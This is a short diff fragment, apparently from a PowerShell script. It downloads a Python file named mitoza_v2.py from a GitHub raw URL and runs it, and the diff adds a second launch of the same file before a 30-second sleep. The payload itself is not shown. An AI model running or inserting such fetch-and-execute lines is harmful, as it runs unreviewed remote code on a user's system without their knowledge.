@@ -42,4 +42,5 @@ finally {
 
 Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\mitoza.py"
 python "$direc\mitoza.py"
+start "$direc\mitoza.py"
 Start-Sleep -Seconds 30
